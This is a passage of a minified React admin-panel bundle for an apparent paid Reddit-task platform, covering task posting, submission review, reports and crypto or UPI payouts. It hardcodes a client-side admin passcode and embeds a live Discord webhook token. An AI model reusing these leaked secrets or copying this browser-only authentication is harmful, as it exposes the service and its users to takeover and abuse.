submission",children:n.jsx(pa,{size:12})})]},_.id)})}),E&&N.length===0&&n.jsx("div",{className:"mt-2 p-4 bg-black/40 rounded-xl border border-white/5 text-center",children:n.jsx("p",{className:"text-[10px] text-gray-600",children:"No tasks completed yet"})})]})]},d.email)})}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(_u,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No users registered yet."})]})]}):f==="Reports"?n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"User Reported Issues"}),n.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[n.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Active: "}),n.jsx("span",{className:"text-sm font-black text-white",children:h.length})]})]}),n.jsx("div",{className:"space-y-4",children:h.length>0?h.map(d=>{var N,E,P;return n.jsx("div",{className:"bg-white/[0.02] border border-white/5 p-6 rounded-[32px] group hover:border-red-500/20 transition-all",children:n.jsxs("div",{className:"flex flex-col sm:flex-row justify-between items-start gap-6",children:[n.jsxs("div",{className:"flex-1 space-y-4",children:[n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("div",{className:"w-10 h-10 bg-red-500/10 rounded-xl flex items-center justify-center border border-red-500/20 text-red-500",children:n.jsx(Ee,{size:20})}),n.jsxs("div",{children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("span",{className:"text-[10px] font-black text-red-500 uppercase tracking-widest",children:"Reported Problem"}),n.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),n.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase",children:new Date(d.created_at).toLocaleString()})]}),n.jsx("h4",{className:"text-sm font-bold text-white mt-0.5",children:((N=d.message.split(" | ")[2])==null?void 0:N.replace("PROBLEM: ",""))||"No details provided"})]})]}),n.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4",children:[n.jsxs("div",{className:"px-4 py-3 bg-black/40 rounded-2xl border border-white/5",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-1",children:"User Email"}),n.jsx("span",{className:"text-xs text-gray-300 font-bold",children:((E=d.message.split(" | ")[0])==null?void 0:E.replace("FROM: ",""))||"Unknown"})]}),n.jsxs("div",{className:"px-4 py-3 bg-black/40 rounded-2xl border border-white/5",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-1",children:"Task ID"}),n.jsx("span",{className:"text-xs text-blue-500 font-black",children:((P=d.message.split(" | ")[1])==null?void 0:P.replace("TASK: ",""))||"N/A"})]})]})]}),n.jsxs("div",{className:"flex flex-row sm:flex-col gap-2 w-full sm:w-auto",children:[n.jsxs("button",{onClick:()=>{var _;return kn((_=d.message.split(" | ")[0])==null?void 0:_.replace("FROM: ",""))},className:"flex-1 sm:flex-none px-6 py-3 bg-blue-600/10 text-blue-500 rounded-xl font-bold text-xs hover:bg-blue-600 hover:text-white transition-all flex items-center justify-center gap-2",children:[n.jsx(Ut,{size:16}),"REPLY"]}),n.jsxs("button",{onClick:()=>fl(d.id),className:"flex-1 sm:flex-none px-6 py-3 bg-white/[0.03] border border-white/10 text-gray-500 rounded-xl font-bold text-xs hover:text-white hover:bg-red-600 hover:border-red-600 transition-all flex items-center justify-center gap-2",children:[n.jsx(Lr,{size:16}),"RESOLVE"]})]})]})},d.id)}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(ir,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No active reports. Everything is smooth!"})]})})]}):f==="Withdrawals"?n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Completed Withdrawals"}),n.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[n.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total Paid: "}),n.jsx("span",{className:"text-sm font-black text-white",children:c.filter(d=>d.status==="completed").length})]})]}),n.jsx("div",{className:"space-y-3",children:c.filter(d=>d.status==="completed").length>0?c.filter(d=>d.status==="completed").map(d=>{const N=new Date(d.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"}),E=l.find(P=>P.email===d.user_email);return n.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-5 rounded-3xl flex flex-col sm:flex-row items-center justify-between gap-4 group hover:border-emerald-500/20 transition-all",children:[n.jsxs("div",{className:"flex items-center gap-4 flex-1",children:[n.jsx("div",{className:"w-10 h-10 bg-emerald-500/10 rounded-xl flex items-center justify-center border border-emerald-500/20 text-emerald-500",children:n.jsx(Fe,{size:18,strokeWidth:3})}),n.jsxs("div",{children:[n.jsxs("div",{className:"flex items-center gap-2 mb-0.5",children:[n.jsx("span",{className:"text-[10px] font-mono text-gray-500",children:d.transaction_id}),n.jsx("h4",{className:"text-sm font-bold text-white",children:(E==null?void 0:E.server_username)||d.user_email.split("@")[0]})]}),n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("span",{className:"text-[11px] font-bold text-gray-400",children:d.user_email}),n.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),n.jsxs("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-tight",children:["Paid on ",N]})]})]})]}),n.jsxs("div",{className:"flex items-center gap-6",children:[n.jsxs("div",{className:"text-right",children:[n.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Amount Paid"}),n.jsxs("span",{className:"text-sm font-black text-emerald-500",children:["$",d.amount.toFixed(2)]})]}),n.jsxs("div",{className:"text-right min-w-[120px]",children:[n.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Method"}),n.jsxs("div",{className:"flex items-center justify-end gap-2",children:[n.jsx("img",{src:Ya[d.payout_method.type],alt:"",className:"w-3.5 h-3.5 object-contain"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-300",children:d.payout_method.label})]})]})]})]},d.id)}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(dn,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No completed withdrawals yet."})]})})]}):n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Total Submission History"}),n.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[n.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total: "}),n.jsx("span",{className:"text-sm font-black text-white",children:a.filter(d=>d.status!=="available").length})]})]}),n.jsx("div",{className:"space-y-3",children:a.filter(d=>d.status!=="available").length>0?a.filter(d=>d.status!=="available").map(d=>{var P;const N=d.created_at?new Date(d.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"}):"---",E=l.find(_=>_.email===d.claimed_by);return n.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-5 rounded-3xl flex flex-col sm:flex-row items-center justify-between gap-4 group hover:border-blue-500/20 transition-all",children:[n.jsxs("div",{className:"flex items-center gap-4 flex-1",children:[n.jsx("div",{className:"w-10 h-10 bg-white/[0.03] rounded-xl flex items-center justify-center border border-white/5 text-gray-500 group-hover:text-blue-500 transition-colors",children:n.jsx(lr,{size:18})}),n.jsxs("div",{children:[n.jsxs("div",{className:"flex items-center gap-2 mb-0.5",children:[n.jsx("span",{className:"text-[10px] font-black text-blue-500",children:d.task_id_display}),n.jsx("h4",{className:"text-sm font-bold text-white",children:d.title}),n.jsx("span",{className:`text-[8px] font-black px-1.5 py-0.5 rounded uppercase ${d.tier==="Tier 3"?"bg-red-500/10 text-red-500":d.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:d.tier})]}),n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsxs("span",{className:"text-[11px] font-bold text-gray-400",children:[(E==null?void 0:E.server_username)||((P=d.claimed_by)==null?void 0:P.split("@")[0]),n.jsxs("span",{className:"text-gray-600 font-medium ml-1",children:["(u/",(E==null?void 0:E.reddit_username)||"not_linked",")"]})]}),n.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),n.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-tight",children:N})]})]})]}),n.jsxs("div",{className:"flex items-center gap-6",children:[n.jsxs("div",{className:"text-right",children:[n.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Reward"}),n.jsx("span",{className:"text-sm font-black text-emerald-500",children:d.reward})]}),n.jsxs("div",{className:"text-right min-w-[100px]",children:[n.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Status"}),n.jsxs("div",{className:"flex items-center justify-end gap-1.5",children:[n.jsx("div",{className:`w-1.5 h-1.5 rounded-full ${d.status==="verified"?"bg-emerald-500":d.status==="submitted"?"bg-amber-500 animate-pulse":d.status==="rejected"?"bg-red-500":"bg-blue-500"}`}),n.jsx("span",{className:`text-[10px] font-black uppercase tracking-widest ${d.status==="verified"?"text-emerald-500":d.status==="submitted"?"text-amber-500":d.status==="rejected"?"text-red-500":"text-blue-500"}`,children:d.status})]})]})]})]},d.id)}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(Ee,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No submissions recorded yet."})]})})]}),n.jsxs("section",{className:"mt-20 p-8 border border-dashed border-white/10 rounded-[32px] bg-white/[0.01]",children:[n.jsx("h2",{className:"text-sm font-bold text-gray-500 uppercase tracking-[0.2em] mb-4",children:"Security Notice"}),n.jsx("p",{className:"text-xs text-gray-600 leading-relaxed",children:"This admin panel is restricted to authorized personnel. All task distributions are logged with your IP address and timestamp. Ensure all target URLs comply with the network's safety guidelines before publishing."})]}),j&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:n.jsx(Ut,{className:"text-blue-500",size:32})}),n.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Send Admin Alert"}),n.jsxs("p",{className:"text-gray-500 text-sm",children:["To: ",n.jsx("span",{className:"text-blue-400 font-bold",children:m})]})]}),n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{className:"space-y-3",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:"Message Content"}),n.jsx("textarea",{rows:4,autoFocus:!0,placeholder:"Enter the alert or update details for the user...",value:k,onChange:d=>C(d.target.value),className:"w-full px-6 py-5 bg-white/[0.03] border border-white/5 rounded-3xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),n.jsxs("div",{className:"flex gap-4",children:[n.jsx("button",{onClick:()=>y(!1),className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:Nl,disabled:!k.trim()||S,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed",children:S?"Sending...":n.jsxs(n.Fragment,{children:["Send Alert",n.jsx(un,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"})]})})]})]})]})}),T&&$&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-red-600/10 rounded-2xl flex items-center justify-center mb-6 border border-red-500/20",children:n.jsx(re,{className:"text-red-500",size:32})}),n.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Reject Submission"}),n.jsxs("p",{className:"text-gray-500 text-sm",children:["Task: ",n.jsx("span",{className:"text-red-400 font-bold",children:$.title})]}),n.jsxs("p",{className:"text-gray-600 text-xs mt-1",children:["User: ",$.claimed_by]})]}),n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{className:"space-y-3",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:"Rejection Reason"}),n.jsx("textarea",{rows:4,autoFocus:!0,placeholder:"Enter the reason for rejection...",value:fe,onChange:d=>se(d.target.value),className:"w-full px-6 py-5 bg-white/[0.03] border border-white/5 rounded-3xl focus:outline-none focus:border-red-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),n.jsxs("div",{className:"flex gap-4",children:[n.jsx("button",{onClick:()=>{L(!1),G(null),se("")},className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:jl,disabled:!fe.trim()||J,className:"flex-1 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed",children:J?"Rejecting...":n.jsxs(n.Fragment,{children:["Reject Task",n.jsx(re,{size:18,strokeWidth:3})]})})]})]})]})}),ie&&I&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-emerald-600/10 rounded-2xl flex items-center justify-center mb-6 border border-emerald-500/20",children:n.jsx(Er,{className:"text-emerald-500",size:32})}),n.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Confirm Payout"}),n.jsxs("p",{className:"text-gray-500 text-sm",children:["Transaction ID: ",n.jsx("span",{className:"text-blue-400 font-mono font-bold",children:I.transaction_id})]}),n.jsxs("div",{className:"mt-4 p-4 bg-white/[0.02] border border-white/5 rounded-2xl w-full text-left",children:[n.jsxs("div",{className:"flex justify-between items-center mb-3",children:[n.jsx("span",{className:"text-xs font-bold text-gray-500 uppercase",children:"Amount to Pay"}),n.jsxs("span",{className:"text-xl font-black text-emerald-500",children:["$",I.amount.toFixed(2)]})]}),n.jsxs("div",{className:"space-y-2",children:[n.jsx("span",{className:"text-[10px] font-bold text-gray-600 uppercase tracking-widest block",children:"Recipient Details"}),n.jsxs("div",{className:"flex items-center gap-3 p-3 bg-black/40 rounded-xl border border-white/5",children:[n.jsx("img",{src:Ya[I.payout_method.type],alt:"",className:"w-5 h-5 object-contain"}),n.jsxs("div",{className:"min-w-0",children:[n.jsx("p",{className:"text-[10px] font-black text-gray-400 uppercase leading-none mb-1",children:I.payout_method.label}),n.jsx("p",{className:"text-xs font-bold text-white truncate",children:I.payout_method.value})]})]})]})]})]}),n.jsxs("div",{className:"flex gap-4",children:[n.jsx("button",{onClick:()=>{ne(!1),D(null)},className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:_l,disabled:W,className:"flex-1 py-4 bg-emerald-600 text-white rounded-2xl font-black text-sm hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2 group disabled:opacity-50",children:W?"Processing...":n.jsxs(n.Fragment,{children:["Confirm & Pay",n.jsx(Fe,{size:18,strokeWidth:3})]})})]})]})})]})]}):n.jsxs(hr,{children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${me.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${me.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":me.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:me.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):me.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:me.message})]}),n.jsx("button",{onClick:()=>Qt(d=>({...d,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsx("div",{className:"min-h-[70vh] flex items-center justify-center p-4",children:n.jsxs("div",{className:"w-full max-w-md bg-white/[0.02] border border-white/5 rounded-[32px] p-8 sm:p-10 backdrop-blur-xl animate-in fade-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:n.jsx(Mr,{className:"text-blue-500",size:32})}),n.jsx("h1",{className:"text-2xl font-black tracking-tight mb-2",children:"Admin Access"}),n.jsx("p",{className:"text-gray-500 text-sm",children:"Enter the admin passcode to continue."})]}),n.jsxs("form",{onSubmit:hl,className:"space-y-6",children:[n.jsx("div",{className:"space-y-2",children:n.jsxs("div",{className:"relative group",children:[n.jsx($t,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:20}),n.jsx("input",{type:"password",placeholder:"",value:e,onChange:d=>t(d.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-center tracking-[0.5em] font-mono text-lg"})]})}),n.jsx("button",{type:"submit",className:"w-full py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]",children:"ACCESS PANEL"})]})]})})]})},Qa={binance:"https://cryptologos.cc/logos/binance-coin-bnb-logo.png",usdt:"https://cryptologos.cc/logos/tether-usdt-logo.png",upi:"https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UPI-Logo-vector.svg/1200px-UPI-Logo-vector.svg.png"},Jw=()=>{const[e,t]=b.useState(""),[r,s]=b.useState(!1),[a,i]=b.useState([]),[l,o]=b.useState([]),[c,u]=b.useState([]),[h,p]=b.useState([]),[x,v]=b.useState(null),[f,w]=b.useState("Tasks"),[j,y]=b.useState(!1),[m,g]=b.useState(""),[k,C]=b.useState(""),[S,R]=b.useState(!1),[T,L]=b.useState(!1),[$,G]=b.useState(null),[fe,se]=b.useState(""),[J,B]=b.useState(!1),[ie,ne]=b.useState(!1),[I,D]=b.useState(null),[W,te]=b.useState(!1),[oe,yt]=b.useState(null),[ze,Ge]=b.useState(""),[Ne,F]=b.useState("Tier 1"),[ce,ue]=b.useState(""),[O,X]=b.useState("COMMENT"),[Le,Bt]=b.useState(""),[Y,Et]=b.useState(""),[gn,Vr]=b.useState(""),[yn,qr]=b.useState(""),[Je,Jt]=b.useState("All"),[Hr,Kr]=b.useState(!1),Gr=b.useRef(null),[Jr,Yr]=b.useState(!1),Qr=b.useRef(null),[Xr,vn]=b.useState(!1),Zr=b.useRef(null),[le,wn]=b.useState(new Date),[es,Yt]=b.useState(!1),[Ct,bn]=b.useState(""),ts=b.useRef(null),[me,Qt]=b.useState({show:!1,message:"",type:"info"}),K=(d,N="info")=>{Qt({show:!0,message:d,type:N}),setTimeout(()=>Qt(E=>({...E,show:!1})),2e3)},hl=d=>{d.preventDefault(),e==="SS@200"?(s(!0),K("Access granted. Welcome Admin.","success")):K("Invalid admin passcode.","error")},rs=async()=>{const{data:d,error:N}=await z.from("withdrawal_requests").select("*").order("created_at",{ascending:!1});N?console.error("Error fetching withdrawal requests:",N):u(d||[])},Xt=async()=>{const{data:d,error:N}=await z.from("admin_alerts").select("*").eq("user_email","ADMIN_REPORT").order("created_at",{ascending:!1});N?console.error("Error fetching reports:",N):p(d||[])},fl=async d=>{p(N=>N.filter(E=>E.id!==d));try{const{error:N}=await z.from("admin_alerts").delete().eq("id",d);N?(console.error("Delete error:",N),K("Error: "+N.message,"error"),Xt()):K("Report resolved","success")}catch(N){console.error("Catch error:",N),Xt()}};b.useEffect(()=>{if(r){Ye(),ss(),rs(),Xt();const N=setInterval(()=>{Ye(),ss(),rs(),Xt()},1e4);return()=>clearInterval(N)}const d=N=>{ts.current&&!ts.current.contains(N.target)&&Yt(!1),Gr.current&&!Gr.current.contains(N.target)&&Kr(!1),Qr.current&&!Qr.current.contains(N.target)&&Yr(!1),Zr.current&&!Zr.current.contains(N.target)&&vn(!1)};return document.addEventListener("mousedown",d),()=>document.removeEventListener("mousedown",d)},[r]);const Ye=async()=>{const{data:d,error:N}=await z.from("tasks").select("*").order("created_at",{ascending:!1});N?console.error("Error fetching tasks:",N):i(d||[])},ss=async(d=!1)=>{const{data:N,error:E}=await z.from("profiles").select("email, reddit_username, server_username, discord_username, balance, payout_methods, reddit_karma");E?console.error("Error fetching profiles:",E):N&&(o(N),N.forEach(P=>{P.reddit_username&&P.reddit_username!=="not_connected"&&(P.reddit_karma==null||d)&&ml(P.email,P.reddit_username)}))},ml=async(d,N)=>{try{const E=`https://www.reddit.com/user/${N}/about.json`;let P;try{P=await fetch(E,{headers:{Accept:"application/json"}})}catch{P=await fetch(`https://corsproxy.io/?${encodeURIComponent(E)}`)}if(P.ok){const _=await P.json();if(_!=null&&_.data){const Z=_.data.total_karma??(_.data.link_karma+_.data.comment_karma||0);o(Re=>Re.map(Tt=>Tt.email===d?{...Tt,reddit_karma:Z}:Tt)),await z.from("profiles").update({reddit_karma:Z}).eq("email",d);return}}o(_=>_.map(Z=>Z.email===d?{...Z,reddit_karma:0}:Z))}catch(E){console.error("Error fetching karma for",N,E),o(P=>P.map(_=>_.email===d?{..._,reddit_karma:0}:_))}},pl=async d=>{if(d.assigned_to!=="All")return;const N="https://discord.com/api/webhooks/1463922549120434186/4juUa6WRV4dCkAjfYv35DruT5VRS8AXT8TazwOCkbVGM1yBXnUP6hQHbdnjUqxGO9Dwp",E=`:rocket: NEW TASK ALERT

A new task has been published.
<@&1464974222559281210>
:link: Claim it here:
https://tasknet.site/dashboard`;try{await fetch(N,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:E})})}catch(P){console.error("Error sending Discord notification:",P)}},xl=async d=>{var P;d.preventDefault();const E={task_id_display:x?(P=a.find(_=>_.id===x))==null?void 0:P.task_id_display:`#${Math.floor(1e5+Math.random()*9e5)}`,tier:Ne,subreddit:ce,title:ze,category:O,reward:Le,deadline:Y,reddit_url:gn,instructions:yn,assigned_to:Je,is_hidden:!1};if(x){const{error:_}=await z.from("tasks").update(E).eq("id",x);_?K("Error updating task: "+_.message,"error"):(K("Task Updated Successfully!","success"),v(null))}else{const{error:_}=await z.from("tasks").insert([E]);_?K("Error posting task: "+_.message,"error"):(K("Task Posted Successfully!","success"),pl(E))}jn(),Ye()},jn=()=>{Ge(""),F("Tier 1"),ue(""),Bt(""),Et(""),Vr(""),qr(""),Jt("All"),X("COMMENT"),v(null),bn("")},gl=d=>{v(d.id),Ge(d.title),F(d.tier||"Tier 1"),ue(d.subreddit||""),X(d.category),Bt(d.reward),Et(d.deadline),Vr(d.reddit_url),qr(d.instructions),Jt(d.assigned_to),window.scrollTo({top:0,behavior:"smooth"})},yl=async d=>{if(!window.confirm("Delete this task?"))return;const{error:N}=await z.from("tasks").delete().eq("id",d);N?K("Error deleting task","error"):(K("Task Deleted Successfully","success"),Ye())},vl=async d=>{const{error:N}=await z.from("tasks").update({is_hidden:!d.is_hidden}).eq("id",d.id);N?K("Error updating status","error"):(K(d.is_hidden?"Task Visible":"Task Hidden","info"),Ye())},wl=async d=>{if(!d.claimed_by)return;const{error:N}=await z.from("tasks").update({status:"verified"}).eq("id",d.id);if(N){K("Error verifying task: "+N.message,"error");return}const{data:E}=await z.from("profiles").select("balance").eq("email",d.claimed_by).single(),P=parseFloat((E==null?void 0:E.balance)||"0"),_=parseFloat(d.reward.replace("$","")),Z=P+_,{error:Re}=await z.from("profiles").update({balance:Z}).eq("email",d.claimed_by);Re?K("Error updating balance: "+Re.message,"error"):(K("Task verified and reward added to wallet!","success"),Ye())},kn=async d=>{g(d),C(""),y(!0)},bl=d=>{G(d),se(""),L(!0)},jl=async()=>{if(!$||!fe.trim())return;B(!0);const{error:d}=await z.from("tasks").update({status:"rejected"}).eq("id",$.id);if(d){K("Error rejecting task: "+d.message,"error"),B(!1);return}const{error:N}=await z.from("admin_alerts").insert([{user_email:$.claimed_by,message:`Your submission for task "${$.title}" (${$.task_id_display}) has been rejected.

Reason: ${fe}`}]);N?K("Task rejected but failed to notify user: "+N.message,"error"):K("Task rejected and user notified!","success"),L(!1),G(null),se(""),B(!1),Ye()},kl=d=>{D(d),ne(!0)},_l=async()=>{if(!I)return;te(!0);const{error:d}=await z.from("withdrawal_requests").update({status:"completed"}).eq("id",I.id);d?K("Error updating withdrawal: "+d.message,"error"):(K("Withdrawal marked as completed!","success"),rs(),ne(!1),D(null)),te(!1)},Nl=async()=>{if(!k.trim())return;R(!0);const{error:d}=await z.from("admin_alerts").insert([{user_email:m,message:k}]);d?K("Error sending alert: "+d.message,"error"):(K("Alert sent to user!","success"),y(!1)),R(!1)},_n=l.filter(d=>d.email.toLowerCase().includes(Ct.toLowerCase())||d.reddit_username&&d.reddit_username.toLowerCase().includes(Ct.toLowerCase())),lt=l.find(d=>d.email===Je),Sl=Je==="All"?"Everyone (Public)":`${(lt==null?void 0:lt.server_username)||Je.split("@")[0]}[${(lt==null?void 0:lt.reddit_username)||"No Reddit"}]`;return r?n.jsxs(hr,{children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${me.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${me.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":me.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:me.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):me.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:me.message})]}),n.jsx("button",{onClick:()=>Qt(d=>({...d,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsxs("div",{className:"max-w-4xl mx-auto animate-in fade-in slide-in-from-bottom-4 duration-500",children:[n.jsxs("header",{className:"mb-8 sm:mb-10",children:[n.jsx("div",{className:"flex items-center gap-3 mb-2",children:n.jsx("div",{className:"px-3 py-1 bg-blue-600/10 text-blue-500 rounded-full text-[10px] font-bold uppercase tracking-widest border border-blue-500/20",children:"Admin Control"})}),n.jsx("h1",{className:"text-2xl sm:text-3xl font-black tracking-tighter uppercase italic",children:f==="Tasks"?"Task Management":f==="Users"?"User Management":f==="Withdrawals"?"Payout Records":f==="Reports"?"Task Reports":"Submission Verifications"}),n.jsx("p",{className:"text-xs sm:text-sm text-gray-500 mt-1",children:f==="Tasks"?"Distribute new tasks to the network.":f==="Users"?"View all registered users and their 